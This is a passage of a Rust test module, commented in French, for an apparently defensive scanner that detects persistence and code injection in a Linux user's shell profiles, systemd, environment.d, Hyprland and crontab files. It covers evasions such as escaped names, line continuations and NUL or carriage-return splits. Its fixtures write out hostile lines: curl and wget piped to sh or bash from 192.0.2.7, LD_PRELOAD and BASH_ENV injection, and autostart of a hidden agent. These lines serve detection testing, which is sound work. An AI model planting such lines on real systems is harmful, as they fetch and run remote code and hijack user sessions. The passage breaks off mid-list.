            assert!(crate::apprentissage::declarable(&plus_tard).is_err(), "{texte:?}");
            assert!(
                refus(&plus_tard).contains("courte liste"),
                "{texte:?} : {}",
                refus(&plus_tard)
            );
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{texte:?}");
        }
        for texte in [
            "[Unit]\nDescription=Rappel\nAfter=graphical-session.target\nWants=reseau.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=5\nEnvironment=LANG=fr_CA.UTF-8 TZ=America/Montreal\n\n[Install]\nWantedBy=default.target\n",
            "# rien\n",
        ] {
            assert!(
                directive_refusee(texte).is_none(),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
        }
    }

    /// Deuxième vérification de la campagne E, P1 : un fichier des variables qui pose une variable d'injection, même
    /// échappée ou coupée par des guillemets, avant le choix comme après : rien ne se déclare, et le refus nomme le
    /// fichier et la ligne.
    #[test]
    fn variable_d_injection_refusee() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/environment.d/50-x.conf",
                "LANG=C\nBASH_ENV=/home/alice/.e\n",
                "~/.config/environment.d/50-x.conf:2",
            ),
            (
                ".config/environment.d/50-x.conf",
                "\\x4cD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (".profile", "export \"LD_\"'PRELOAD'=/tmp/l.so\n", "~/.profile:1"),
            (".bashrc", "export $'\\x4c'D_PRELOAD=/tmp/l.so\n", "~/.bashrc:1"),
            (".zshenv", "NODE_OPTIONS=--require=/tmp/x.js\n", "~/.zshenv:1"),
            (".bashrc", "unset SHELLOPTS\n", "~/.bashrc:1"),
            (
                ".config/hypr/hyprland.conf",
                "env = GTK_MODULES,x\n",
                "~/.config/hypr/hyprland.conf:1",
            ),
            // Vérification 2 : le dossier d'où Omarchy charge sa bibliothèque Lua.
            (
                ".config/environment.d/50-x.conf",
                "OMARCHY_PATH=/tmp/.x/omarchy\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("injection-{i}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok());
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            assert!(refus(&c).contains(attendu), "{texte:?} : {}", refus(&c));
            assert!(!crate::apprentissage::essai_tait(&declare, &c), "{texte:?}");
        }
        // Dans un fichier lu par « . » : la lecture d'une variable d'injection qui ne fait pas charger de code
        // (SHELLOPTS, PYTHONPATH) ne pose rien, « ${NOM:=…} » la pose.
        let m = maison_avec_rappel("injection-source");
        m.ecrire(".bashrc", "[ -r ~/.autres/p.sh ] && . ~/.autres/p.sh\n");
        m.ecrire(
            ".autres/p.sh",
            "local o=$SHELLOPTS:$BASHOPTS\n[ -n \"${#PYTHONPATH}\" ]\n",
        );
        assert!(
            crate::apprentissage::declarable(&m.lancements()).is_ok(),
            "{}",
            refus(&m.lancements())
        );
        // R-6 (re-contrôle 0.95, angle lecture) : un fichier inclus se juge ligne à ligne, avec la règle de ~/.bashrc :
        // une ligne qui nomme LD_PRELOAD, même pour la lire seulement, se signale. Avant, le fichier inclus n'était lié
        // que par son empreinte, et un « export LD_PRELOAD=… » posé là ne donnait aucun constat ; une même règle
        // partout, plutôt qu'une exception qui se contourne : un faux positif lève, il ne tait rien.
        m.ecrire(
            ".autres/p.sh",
            "local o=$SHELLOPTS:$BASHOPTS\n[ -n \"${LD_PRELOAD}${#PYTHONPATH}\" ]\n",
        );
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
        assert!(refus(&c).contains("~/.autres/p.sh:2"), "{}", refus(&c));
        m.ecrire(".autres/p.sh", ": ${LD_PRELOAD:=/tmp/l.so}\n");
        assert!(
            refus(&m.lancements()).contains("~/.autres/p.sh:1"),
            "{}",
            refus(&m.lancements())
        );
        // Un commentaire qui la nomme ne pose rien.
        let m = maison_avec_rappel("injection-commentaire");
        m.ecrire(".profile", "# export LD_PRELOAD=/tmp/l.so\nexport LANG=C\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
    }

    /// Troisième vérification de la campagne E, V1 : un nom coupé par « \ » en fin de ligne (le lecteur joint la
    /// suivante sans rien entre les deux) se lit joint ; un « . » coupé de même se suit.
    #[test]
    fn nom_coupe_par_une_continuation_refuse() {
        for (i, (fichier, texte, attendu)) in [
            (".profile", "export L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:1"),
            (".bashrc", "export B\\\nASH_ENV=/home/alice/.e\n", "~/.bashrc:1"),
            (".bashrc", "declare -x L\\\nD_PRELOAD=/tmp/l.so\n", "~/.bashrc:1"),
            (".bashrc", "LANG=C\nexport L\\  \nD_PRELOAD=/tmp/l.so\n", "~/.bashrc:2"),
            (
                ".config/environment.d/50-x.conf",
                "L\\\nD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nDefaultEnvironment=\\\nLD_PRELOAD=/tmp/l.so\n",
                "~/.config/systemd/user.conf.d/x.conf:3",
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nDefaultEnvironment=B\\\nASH_ENV=/home/alice/.e\n",
                "~/.config/systemd/user.conf.d/x.conf:2",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("coupe-{i}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok());
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            assert!(refus(&c).contains(attendu), "{texte:?} : {}", refus(&c));
            assert!(!crate::apprentissage::essai_tait(&declare, &c), "{texte:?}");
        }
        let m = maison_avec_rappel("coupe-source");
        m.ecrire(".bashrc", ". \\\n~/.autres/p.sh\n");
        m.ecrire(".autres/p.sh", ": ${LD_PRELOAD:=/tmp/l.so}\n");
        assert!(
            refus(&m.lancements()).contains("~/.autres/p.sh:1"),
            "{}",
            refus(&m.lancements())
        );
    }

    /// Troisième vérification, AWKLIBPATH et VSSCRIPT_PATH : posées par un paquet dans un fichier de root
    /// (/etc/profile.d/gawk.sh), elles passent ; dans un fichier du compte, elles font charger du code : refusées.
    #[test]
    fn variables_de_paquets_refusees_dans_le_compte() {
        for (i, ligne) in ["export AWKLIBPATH=/tmp/a\n", "VSSCRIPT_PATH=/tmp/v\n"]
            .into_iter()
            .enumerate()
        {
            let m = maison_avec_rappel(&format!("paquet-{i}"));
            m.ecrire(".profile", ligne);
            let c = m.lancements();
            assert!(refus(&c).contains("~/.profile:1"), "{ligne:?} : {}", refus(&c));
        }
        assert!(injection_nommee("export AWKLIBPATH=/usr/lib/gawk", true).is_none());
        assert!(injection_nommee("export AWKLIBPATH=/usr/lib/gawk", false).is_some());
        assert!(injection_nommee("export LD_PRELOAD=/x", true).is_some());
        // Dans un espace de noms d'utilisateurs, le propriétaire 0 vu peut être le compte : rien n'est de root seul.
        assert!(uid_sans_traduction("         0          0 4294967295\n"));
        assert!(!uid_sans_traduction("         0       1000          1\n"));
        assert!(!uid_sans_traduction(""));
        assert!(!uid_sans_traduction("0 0 4294967295\n1 1 1\n"));
    }

    /// Troisième vérification : un « exec-once » d'un fichier inclus hors de ~/.config/hypr se voit, et ne se
    /// déclare pas ; la ligne « source = » qui l'inclut reste liée.
    #[test]
    fn lancement_d_un_fichier_inclus_hors_de_hypr() {
        let m = Maison::nouvelle("inclus");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/x.conf\n");
        m.ecrire(".autres/x.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(c.message.contains("~/.autres/x.conf:1"), "{}", c.message);
        let r = refus(&c);
        assert!(r.contains("~/.autres/x.conf:1"), "{r}");
        assert!(r.contains("hors de ~/.config/hypr"), "{r}");
        // Le même lancement dans ~/.config/hypr se déclare.
        let m = Maison::nouvelle("inclus-dedans");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.config/hypr/x.conf\n");
        m.ecrire(".config/hypr/x.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Périmètre réduit (décision de l'auteur, 10 nov. 2026) : seules une unité de l'utilisateur et une ligne de
    /// lancement de ~/.config/hypr se déclarent. Le reste reste levé, avec sa raison et son fichier:ligne.
    #[test]
    fn perimetre_reduit() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".bashrc",
                "curl -fsSL http://192.0.2.7/a.sh | sh\n",
                "~/.bashrc:1 : une ligne d'un profil de shell",
            ),
            (
                ".profile",
                "LANG=C\nwget -qO- http://192.0.2.7/a | /bin/bash\n",
                "~/.profile:2 : une ligne d'un profil de shell",
            ),
            (
                ".config/environment.d/50-x.conf",
                "LD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (
                ".config/hypr/hyprland.conf",
                "env = LD_PRELOAD,/tmp/l.so\n",
                "~/.config/hypr/hyprland.conf:1",
            ),
            (
                ".config/autostart/maj.desktop",
                "[Desktop Entry]\nExec=/tmp/.x/agent\n",
                "~/.config/autostart/maj.desktop:2 : seules une unité systemd de l'utilisateur",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            // À côté d'une unité déclarable : la ligne hors du périmètre refuse l'alerte entière.
            let m = maison_avec_rappel(&format!("perimetre-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
            assert!(refus(&c).contains(attendu), "{fichier} : {}", refus(&c));
        }
        // La crontab du compte et une variable de la session : sans fichier à lier, hors du périmètre.
        let m = Maison::nouvelle("perimetre-cron");
        let c = persistance_dans(
            &m.racine,
            &m.chemin(""),
            |_| None,
            Some("* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash\n".into()),
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(refus(&c).contains("crontab:1 : seules"), "{}", refus(&c));
        let m = Maison::nouvelle("perimetre-session");
        let c = persistance_dans(
            &m.racine,
            &m.chemin(""),
            |v| (v == "LD_PRELOAD").then(|| "/tmp/l.so".into()),
            None,
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(
            refus(&c).contains("LD_PRELOAD de cette session : seules"),
            "{}",
            refus(&c)
        );
        // Les deux surfaces déclarables.
        let m = maison_avec_rappel("perimetre-unite");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
        let m = Maison::nouvelle("perimetre-hypr");
        m.ecrire(".config/hypr/autostart.conf", "exec-once = /tmp/.x/agent\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Quatrième vérification : un fichier de Hyprland lu par un lien qui mène hors de ~/.config/hypr (le fichier, le
    /// dossier lui-même, un sous-dossier inclus par « source = ») se voit, et ne se déclare pas ; un lien qui reste
    /// dedans, si.
    #[test]
    fn lien_hors_de_hypr_refuse() {
        use std::os::unix::fs::symlink;
        let lancement = "exec-once = /tmp/.x/agent\n";
        let fichier = Maison::nouvelle("lien-fichier");
        fichier.ecrire(".autres/h.conf", lancement);
        std::fs::create_dir_all(fichier.chemin(".config/hypr")).unwrap();
        symlink(
            fichier.chemin(".autres/h.conf"),
            fichier.chemin(".config/hypr/hyprland.conf"),
        )
        .unwrap();
        let dossier = Maison::nouvelle("lien-dossier");
        dossier.ecrire(".autres/hypr/hyprland.conf", lancement);
        symlink(dossier.chemin(".autres/hypr"), dossier.chemin(".config/hypr")).unwrap();
        let sous = Maison::nouvelle("lien-sous-dossier");
        sous.ecrire(".config/hypr/hyprland.conf", "source = ~/.config/hypr/sous/x.conf\n");
        sous.ecrire(".autres/sous/x.conf", lancement);
        symlink(sous.chemin(".autres/sous"), sous.chemin(".config/hypr/sous")).unwrap();
        for m in [&fichier, &dossier, &sous] {
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
            let r = refus(&c);
            // Un sous-dossier en lien se dit aussi pour lui-même (deuxième vérification, N10).
            assert!(
                r.contains("lien qui mène hors de ~/.config/hypr")
                    || r.contains("dossier de modules de Hyprland qui est un lien"),
                "{r}"
            );
        }
        let dedans = Maison::nouvelle("lien-dedans");
        dedans.ecrire(".config/hypr/vrai.conf", lancement);
        symlink(
            dedans.chemin(".config/hypr/vrai.conf"),
            dedans.chemin(".config/hypr/hyprland.conf"),
        )
        .unwrap();
        let c = dedans.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
    }

    /// Quatrième vérification : une unité de /etc/systemd/user ne se déclare que si seul root peut la changer ; à la
    /// racine fabriquée, à alice, elle est refusée.
    #[test]
    fn unite_de_etc_systemd_user_a_root_seul() {
        let m = Maison::nouvelle("etc-user");
        let unite = m.racine.join("etc/systemd/user/rappel.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, UNITE).unwrap();
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
        let r = refus(&c);
        assert!(
            r.contains("une unité de /etc/systemd/user que le compte peut changer"),
            "{r}"
        );
        // La même unité sous ~/.config/systemd/user se déclare.
        assert!(crate::apprentissage::declarable(&maison_avec_rappel("etc-user-compte").lancements()).is_ok());
    }

    /// F-4 (0.95), sur le vrai système, hors d'un espace de noms d'utilisateurs : les env, rsync et findmnt du système
    /// sont à root seul ; une copie dans un dossier du compte, non.
    #[test]
    fn programmes_de_la_sauvegarde_a_root_seul_en_vrai() {
        if !uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default()) {
            return crate::essais::saute(
                "dans un espace de noms d'utilisateurs (unshare -r), rien n'est « à root seul » : à lancer hors de lui",
            );
        }
        let d = crate::essais::temporaire().join(format!("vanguard-root-seul-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        for nom in ["env", "rsync", "findmnt"] {
            let Some(vrai) = crate::commande::outil_systeme(nom) else {
                crate::essais::saute(&format!("{nom} absent"));
                continue;
            };
            assert!(de_root_seul(&vrai), "{}", vrai.display());
            let copie = d.join(nom);
            std::fs::copy(&vrai, &copie).unwrap();
            assert!(!de_root_seul(&copie), "{}", copie.display());
        }
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// V-2 (relecture du lot c2-uwsm, 0.95) : `chemin_tenu` traverse chaque entrée comme le noyau : le lien nommé, le
    /// lien du milieu, puis la cible ; refuser le seul lien du milieu suffit ; « .. » se défait sur le dossier atteint
    /// (« l/.. » est le parent de la cible de « l », pas le dossier de « l ») ; relatif, absent, boucle : jamais tenu.
    #[test]
    fn chemin_tenu_traverse_chaque_entree() {
        let d = crate::essais::temporaire().join(format!("vanguard-chemin-tenu-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("a/b")).unwrap();
        let d = std::fs::canonicalize(&d).unwrap();
        std::fs::write(d.join("a/b/f"), "x").unwrap();
        std::os::unix::fs::symlink("a/b", d.join("l")).unwrap();
        std::os::unix::fs::symlink(d.join("l/f"), d.join("m")).unwrap();
        std::os::unix::fs::symlink("boucle", d.join("boucle")).unwrap();
        let vus = std::cell::RefCell::new(Vec::new());
        let note = |p: &Path, _: &std::fs::Metadata| {
            vus.borrow_mut().push(p.to_path_buf());
            true
        };
        assert!(chemin_tenu(&d.join("m"), &note));
        let traverses = vus.take();
        for attendu in ["m", "l", "a/b", "a/b/f"] {
            assert!(traverses.contains(&d.join(attendu)), "{attendu} : {traverses:#?}");
        }
        assert!(!chemin_tenu(&d.join("m"), &|p, _| p != d.join("l")));
        assert!(chemin_tenu(&d.join("l/../b/f"), &note));
        assert!(vus.take().last() == Some(&d.join("a/b/f")));
        assert!(!chemin_tenu(Path::new("a/b/f"), &|_, _| true));
        assert!(!chemin_tenu(&d.join("absent"), &|_, _| true));
        assert!(!chemin_tenu(&d.join("boucle"), &|_, _| true));
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// V-2, sur le vrai système, hors d'un espace de noms d'utilisateurs : le vrai env est à root seul, par son chemin
    /// et par un détour de root (« bin/../bin/env ») ; un lien du compte vers lui, ou un chemin qui passe par un lien
    /// du compte vers son dossier, non : le compte choisit où mène le lien.
    #[test]
    fn de_root_seul_juge_chaque_lien_en_vrai() {
        if !uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default()) {
            return crate::essais::saute(
                "dans un espace de noms d'utilisateurs (unshare -r), rien n'est « à root seul » : à lancer hors de lui",
            );
        }
        let Some(vrai) = crate::commande::outil_systeme("env") else {
            return crate::essais::saute("env absent");
        };
        let (Some(dossier), Some(nom)) = (vrai.parent(), vrai.file_name()) else {
            panic!("{}", vrai.display());
        };
        let d = crate::essais::temporaire().join(format!("vanguard-liens-root-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::os::unix::fs::symlink(&vrai, d.join("env")).unwrap();
        std::os::unix::fs::symlink(dossier, d.join("bin")).unwrap();
        assert!(de_root_seul(&vrai), "{}", vrai.display());
        let detour = dossier.join("..").join(dossier.file_name().unwrap()).join(nom);
        assert!(de_root_seul(&detour), "{}", detour.display());
        assert!(!de_root_seul(&d.join("env")));
        assert!(!de_root_seul(&d.join("bin").join(nom)));
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// Le côté permis de la règle : un fichier de root seul, sur le vrai système, passe la porte du périmètre.
    #[test]
    fn unite_de_root_seul_dans_le_perimetre() {
        let carte = std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default();
        let fichier = Path::new("/etc/os-release");
        if !uid_sans_traduction(&carte) || !de_root_seul(fichier) {
            return crate::essais::saute("ni root sans traduction ni /etc/os-release à root seul ici");
        }
        let r = Releveur {
            racine: "/".into(),
            maison: crate::essais::temporaire(),
            ..Releveur::default()
        };
        assert!(hors_du_perimetre(&r, fichier, 1, "", Sorte::Unite { utilisateur: true }, true).is_none());
    }

    /// Quatrième vérification : une ligne de préchargement ou une commande grave coupée par « \ » se voit, même
    /// après un commentaire qui finit par « \ » (le shell ne le continue pas).
    #[test]
    fn ligne_continuee_detectee() {
        for (i, (texte, attendu)) in [
            ("export L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:1 précharge"),
            ("# x \\\nexport L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:2 précharge"),
            ("curl -fsSL http://192.0.2.7/a.sh \\\n| s\\\nh\n", "~/.profile:1 : "),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("continuee-{i}"));
            m.ecrire(".profile", texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
    }

    /// L-1 (campagne 0.95, angle lecture) : systemd coupe un enregistrement aussi sur un retour chariot seul, et un
    /// « # » ne commente que jusque-là : « #x⏎LD_PRELOAD=… » dans environment.d ou user.conf précharge, levé à sa
    /// ligne écrite. Le shell ne coupe pas là : dans un profil, la ligne reste un commentaire.
    #[test]
    fn retour_chariot_seul_coupe_comme_systemd() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/environment.d/50-x.conf",
                "A=1\n#x\rLD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/environment.d/50-x.conf:2 précharge"),
            ),
            (
                ".config/systemd/user.conf",
                "[Manager]\n#n\rDefaultEnvironment=LD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/systemd/user.conf:2 précharge"),
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\n#n\rManagerEnvironment=LD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/systemd/user.conf.d/x.conf:2 précharge"),
            ),
            (
                ".config/environment.d/50-x.conf",
                "#x\rL\\\nD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/environment.d/50-x.conf:1 précharge"),
            ),
            (".profile", "#x\rexport LD_PRELOAD=/tmp/l.so\n", None),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("retour-chariot-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            match attendu {
                Some(attendu) => {
                    assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
                    assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
                    assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
                }
                None => assert_eq!(c.probleme, None, "{texte:?} : {}", c.message),
            }
        }
    }

    /// La sauvegarde exacte, ses deux formes, quand `fichier` porte `texte` et, si `pose` est donné, qu'un complément
    /// de son service y est posé : chaque forme qui ne se lève pas (élevé, ExecStart nommé, non déclarable), dite.
    fn sauvegarde_pas_levee(nom: &str, fichier: &str, texte: &str, pose: Option<&str>) -> Vec<String> {
        const REMPLACE: &str = "[Service]\nExecStart=\nExecStart=/usr/bin/rsync -a /home/alice/Documents /tmp/x\n";
        let mut faux = Vec::new();
        for vide in [false, true] {
            let (m, service) = sauvegarde_d_essai(&format!("{nom}-{vide}"), vide);
            m.ecrire(fichier, texte);
            if let Some(p) = pose {
                m.ecrire(&format!("{p}/{}.d/x.conf", crate::sauvegarde::SERVICE), REMPLACE);
            }
            let c = m.lancements();
            let nommee = service
                .lines()
                .position(|l| l.starts_with("ExecStart="))
                .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1))
                .is_some_and(|e| c.message.contains(&e));
            if !(c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()) {
                faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
            }
        }
        faux
    }

    /// R-1 (re-contrôle 0.95, angle lecture) : le lecteur de réglages de systemd (`read_line`, fileio.c de systemd
    /// 262) finit aussi une ligne sur un octet NUL, et un « # » ne commente que jusque-là : « #n␀ManagerEnvironment=… »
    /// dans user.conf ou user.conf.d pose la variable. Le préchargement se lève à sa ligne écrite, le dossier d'unités
    /// déplacé se lit, la sauvegarde se lève. environment.d : le générateur s'arrête au premier NUL (env-file.c), rien
    /// après n'est appliqué ; la suite se lit quand même, coupée là (pam_env, du même format, n'est pas mesuré).
    #[test]
    fn nul_coupe_comme_systemd() {
        const CONF: &str = ".config/systemd/user.conf";
        for (i, (fichier, texte, attendu)) in [
            (
                CONF,
                "[Manager]\n#n\0DefaultEnvironment=LD_PRELOAD=/tmp/l.so\n",
                "~/.config/systemd/user.conf:2 précharge",
            ),
            (
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\n#n\0ManagerEnvironment=LD_PRELOAD=/tmp/l.so\n",
                "~/.config/systemd/user.conf.d/x.conf:2 précharge",
            ),
            (
                ".config/environment.d/50-x.conf",
                "A=1\n#x\0LD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:2 précharge",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("nul-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
        let deplace = "[Manager]\n#note\0ManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:/usr/share\n";
        let mut faux = sauvegarde_pas_levee("nul-donnees", CONF, deplace, Some(".x/systemd/user"));
        faux.extend(sauvegarde_pas_levee(
            "nul-home",
            ".config/systemd/user.conf.d/x.conf",
            "[Manager]\n#n\0DefaultEnvironment=HOME=/x\n",
            None,
        ));
        assert!(faux.is_empty(), "derrière un NUL : {faux:#?}");
        let m = Maison::nouvelle("nul-unite");
        m.ecrire(CONF, deplace);
        m.ecrire(".x/systemd/user/agent.service", "[Service]\nExecStart=%h/.x/agent\n");
        let c = m.lancements();
        leve_non_declarable(&c, "unité d'un dossier déplacé derrière un NUL");
        assert!(c.message.contains("~/.x/systemd/user/agent.service:2"), "{}", c.message);
    }

    /// R-2 (re-contrôle 0.95, angle lecture) : user.conf se lit comme `config_parse` de systemd 262 le lit. Un « \ »
    /// de fin continue la ligne aussi devant « \r\n » ou « \r␀ » (une seule fin de ligne pour `read_line`) ; seuls
    /// espace, tabulation, « \n », « \r » se sautent avant de chercher « # » ou « ; » (WHITESPACE) : une ligne qui
    /// commence par une tabulation verticale, un saut de page, une espace insécable ou U+0085 n'est pas un
    /// commentaire ; une vraie ligne de commentaire au milieu d'une suite se saute sans finir la suite ; « unset »
    /// n'est qu'un mot ; un nom échappé (« \x44 ») se décode (EXTRACT_CUNESCAPE). Le préchargement se lève, le
    /// dossier d'unités déplacé se lit, la sauvegarde se lève.
    #[test]
    fn user_conf_continue_comme_systemd() {
        const CONF: &str = ".config/systemd/user.conf";
        const SUR: &str = "XDG_DATA_DIRS=/usr/share";
        const CACHE: &str = "XDG_DATA_DIRS=/home/alice/.x:/usr/share";
        let mut cas: Vec<(&str, String, String)> = Vec::new();
        for blanc in ["\x0b", "\x0c", "\u{a0}", "\u{85}"] {
            for c in ['#', ';'] {
                cas.push((
                    CONF,
                    format!("[Manager]\r\nDefaultEnvironment=A=1 \\\r\n{blanc}{c}x LD_PRELOAD=/tmp/l.so\r\n"),
                    "~/.config/systemd/user.conf:3 précharge".into(),
                ));
            }
        }
        cas.push((
            ".config/systemd/user.conf.d/x.conf",
            "[Manager]\r\nManagerEnvironment=A=1 \\\r\n\x0c#x LD_AUDIT=/tmp/l.so\r\n".into(),
            "~/.config/systemd/user.conf.d/x.conf:3 précharge".into(),
        ));
        cas.push((
            CONF,
            "[Manager]\nDefaultEnvironment=A=1 \\\n# note\nunset LD_PRELOAD=/tmp/l.so\n".into(),
            "~/.config/systemd/user.conf:4 précharge".into(),
        ));
        for (i, (fichier, texte, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("suite-systemd-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu.as_str()), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
        let mut deplaces: Vec<String> = ["\x0b", "\x0c", "\u{a0}", "\u{85}"]
            .iter()
            .map(|b| format!("[Manager]\r\nManagerEnvironment={SUR} \\\r\n{b}# x {CACHE}\r\n"))
            .collect();
        deplaces.extend([
            format!("[Manager]\nManagerEnvironment={SUR} \\\n# note\n{CACHE}\n"),
            format!("[Manager]\nManagerEnvironment={SUR} \\\r\0{CACHE}\n"),
            format!("[Manager]\nManagerEnvironment={SUR} XDG_DATA_\\x44IRS=/home/alice/.x:/usr/share\n"),
        ]);
        let mut faux = Vec::new();
        for (i, texte) in deplaces.iter().enumerate() {
            faux.extend(sauvegarde_pas_levee(
                &format!("suite-donnees-{i}"),
                CONF,
                texte,
                Some(".x/systemd/user"),
            ));
            // Le nom échappé est dit non résolu (la sauvegarde se lève), sans lire son dossier.
            if texte.contains("\\x44") {
                continue;
            }
            let m = Maison::nouvelle(&format!("suite-unite-{i}"));
            m.ecrire(CONF, texte);
            m.ecrire(".x/systemd/user/agent.service", "[Service]\nExecStart=%h/.x/agent\n");
            let c = m.lancements();
            if !c.message.contains("~/.x/systemd/user/agent.service:2") {
                faux.push(format!("unité, {texte:?} : {}", c.message));
            }
        }
        faux.extend(sauvegarde_pas_levee(
            "suite-home",
            ".config/systemd/user.conf.d/x.conf",
            "[Manager]\r\nDefaultEnvironment=A=1 \\\r\n\u{a0}# x HOME=/x\r\n",
            None,
        ));
        assert!(faux.is_empty(), "suite de ligne de systemd : {faux:#?}");
        // Témoin : une vraie ligne de commentaire (blancs de systemd devant) ne pose rien et ne lève pas.
        let m = Maison::nouvelle("suite-temoin");
        m.ecrire(CONF, "[Manager]\r\n \t# LD_PRELOAD=/tmp/l.so\r\n");
        let c = m.lancements();
        assert!(!c.message.contains(":2 précharge"), "{}", c.message);
    }

    /// R-3 (re-contrôle 0.95, angle lecture) : un shell (sh, bash, zsh, fish, et uwsm qui source ses fichiers par sh)
    /// n'ouvre un commentaire que par « # » en début de mot, après une espace ou une tabulation seulement. Une ligne
    /// qui commence par « -- », « // », une tabulation verticale ou une espace insécable puis « # » est une commande
    /// (qui échoue), et ce qui suit « ; » s'exécute : mesuré avec sh et bash 5.3, LD_PRELOAD posé. « unset A; » ne
    /// retire pas ce qui suit. Le préchargement se lève, dans les profils comme dans uwsm, même coupé par « \ ».
    #[test]
    fn faux_commentaires_du_shell() {
        let fichiers = [
            ".profile",
            ".bashrc",
            ".zshrc",
            ".config/uwsm/env",
            ".config/uwsm/env.d/a",
            ".config/uwsm/env-hyprland.d/b",
        ];
        let lignes = [
